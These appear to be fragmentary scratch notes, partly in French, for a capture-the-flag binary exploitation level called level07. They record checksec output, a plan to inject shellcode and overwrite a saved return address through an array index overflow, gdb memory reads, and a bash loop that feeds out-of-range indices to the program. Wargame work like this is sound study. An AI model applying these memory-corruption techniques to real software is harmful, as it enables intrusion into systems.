Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level07/level07

Ecrire un shellcode dans le tab
Ecraser le retour via l'overflow du tab
Quit pour exec ?


saved eip main : 0xf7e45513 (u_int : 4159916051)
4294967295 - 4159916051 = -135051244

4158964832

saved eip read : 0x8048930 (u_int : 134514224)

#!/bin/bash

for i in {4294967295..4294967500}; do
    sleep 0.01
    echo "read"
    sleep 0.01
    echo "$i"s
    echo "nb $i"
done | ~/level07

b *main+679

b *read_number+69


0xffffd458 = index 1 
(gdb) x/wx 0xffffd458
0xffffd458:     0xfffffffe

(gdb) x/wx 0xffffd458+452
0xffffd61c:     0xf7e45513

4294967295 = unsigned int max 
4158936339 = nb stored at data[114] = saved eip

-4294967182 = 114 aussi mais ne marche pas

0x8048930 = 134514992 = saved eip read_nb
0xffffd42c = 0x08048930

0xffffd408
0xffffd42c

find /w $ebp, +1000, 0x08048930


nput command: read
 Index: 4294967286
 Number at data[4294967286] is 134514992 (== 8048930)

 3735928559


saved eip 0x80488ef
0xffffd42c


b *get_unum+51
saved eip 0x8048656
0xffffd3fc:     0x08048656
92/4 = 23 octets